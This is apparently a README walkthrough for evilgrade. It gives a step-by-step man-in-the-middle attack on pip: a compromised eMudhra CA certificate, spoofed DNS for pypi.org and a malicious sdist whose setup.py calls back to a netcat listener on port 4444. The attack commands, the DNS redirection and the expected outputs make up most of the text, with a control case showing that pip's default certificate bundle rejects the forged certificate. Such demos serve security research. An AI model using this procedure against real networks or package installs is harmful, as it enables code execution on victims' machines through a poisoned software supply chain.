# pip MITM via eMudhra CA — manual walkthrough

End-to-end by hand, no scripts. The automated equivalent is `run_pip.sh`.

## Why / how it works

- **pip** fetches from its default index `https://pypi.org/simple` (port 443).
  PyPI does not sign sdists and `setup.py` runs at install time, so integrity
  rests on TLS. The eMudhra CA compromise breaks that TLS for any pip that
  trusts the **system store** (`/etc/ssl/cert.pem`). pip's default certifi
  bundle is NOT vulnerable — so we pass `--cert /etc/ssl/cert.pem`.
- **evilgrade** serves the malicious PyPI index + sdist over HTTPS with the
  `certs/emudhra_mitm` cert (CN=`pypi.org`, signed by the compromised
  intermediate), and its **DNS server** answers `pypi.org` with the attacker IP.
- So the victim just runs a bare `pip install evilpkg` — no ports, no flags
  beyond the corp `--cert`.

## Prerequisites (read first — this is what bit the last run)

- **Run evilgrade with `sudo`.** The webserver on :443 and the DNS server on
  :53 are both privileged ports. Without root you get
  `Can't create a listening socket: Address already in use` / `Error Initiating
  DNS Server`.
- **One evilgrade at a time.** If a previous run left a webserver bound, `start`
  fails with "Address already in use". Kill leftovers first:
  ```bash
  sudo pkill -9 -f 'perl ./evilgrade'; sudo pkill -9 -f isrcore
  # or the demo helper:
  ./demo/emudhra_mitm/cleanup.sh
  ```

---

## Terminal 1 — evilgrade (stays running, as root)

```bash
cd /Users/famato/dev/evilgrade

# system perl has IO::Socket::SSL; clear PERL5LIB so it doesn't load Homebrew
# perl's XS .bundle files (the "loadable library ... mismatched" error).
sudo env -u PERL5LIB -u PERL_LOCAL_LIB_ROOT PERL5LIB=.:./isrcore /usr/bin/perl ./evilgrade
```

Inside the `evilgrade>` shell:

```
set sslport 443
set sslcert certs/emudhra_mitm
set DNSAnswerIp 127.0.0.1
configure pypi_update
set enable 1
configure
start
```

- `set DNSAnswerIp <attacker-ip>` is where the DNS server points the victim
  (use `127.0.0.1` for a single-host demo; your real IP on a LAN).
- The DNS server auto-loads its domains from the enabled modules' `vh`, so
  `pypi.org` / `files.pythonhosted.org` are answered automatically — you do not
  list them anywhere.
- `start` brings up the webserver (:443) **and** the DNS server (:53).
- `show vhosts` lists what DNS/HTTP will intercept; `status` confirms both are up.

---

## Terminal 2 — callback listener

```bash
nc -l 4444
```

---

## Terminal 3 — the victim

### 1. Point the victim's DNS at evilgrade

On a real target this is evilgrade's DNS server (set the victim's resolver to
the attacker, or ARP/DHCP/Wi-Fi). On a single host, either set the system DNS
to 127.0.0.1, or just use `/etc/hosts`:

```bash
echo "127.0.0.1 pypi.org files.pythonhosted.org" | sudo tee -a /etc/hosts
```

### 2. Run a bare pip install (default index, no port, no --index-url)

```bash
/usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem evilpkg
```

That's the whole attack from the victim's side: a normal `pip install`. pip
hits `https://pypi.org/simple` → DNS sends it to evilgrade → eMudhra cert is
trusted (system store) → malicious sdist → `setup.py` runs.

### 3. Revert /etc/hosts when done

```bash
sudo sed -i '' '/^127\.0\.0\.1 pypi\.org files\.pythonhosted\.org$/d' /etc/hosts
```

---

## What you should see

- **Terminal 3:** `Successfully installed evilpkg-1.0`.
- **Terminal 1:** requests for `/simple/evilpkg/` and the `.tar.gz`.
- **Terminal 2 (nc):** the `owned by evilgrade -- pip install setup.py MITM`
  block with your `id`.
- **Proof file:** `cat /tmp/OWNED_BY_PIP`

### Control (shows the default is safe)

```bash
# WITHOUT --cert: pip uses its vendored certifi -> eMudhra cert rejected
/usr/bin/python3 -m pip install evilpkg
# -> SSL: CERTIFICATE_VERIFY_FAILED (unable to get local issuer certificate)
```

---

## No-sudo shortcut (local only, less realistic)

If you can't/won't use sudo for the webserver, bind a high port and point pip at
it explicitly (this is the only case where `--index-url` is needed):

Terminal 1: `set sslport 9443` (leave DNS off: `set DNSEnable 0`), then `start`.
Terminal 3 (still needs sudo once for /etc/hosts, or use `--index-url` with the
IP):
```bash
/usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem \
    --index-url https://pypi.org:9443/simple/ evilpkg
```
The automated runner does exactly this with `./demo/emudhra_mitm/run_pip.sh --high-port`.

## Cleanup / re-running

- If `start` says **"Address already in use"** or the victim gets HTTP 000:
  a previous webserver is still bound. `./demo/emudhra_mitm/cleanup.sh`
  (or `sudo pkill -9 -f 'perl ./evilgrade'`).
- If DNS says **"Error Initiating DNS Server"**: you didn't start evilgrade with
  `sudo` (port 53 is privileged), or something else holds :53.
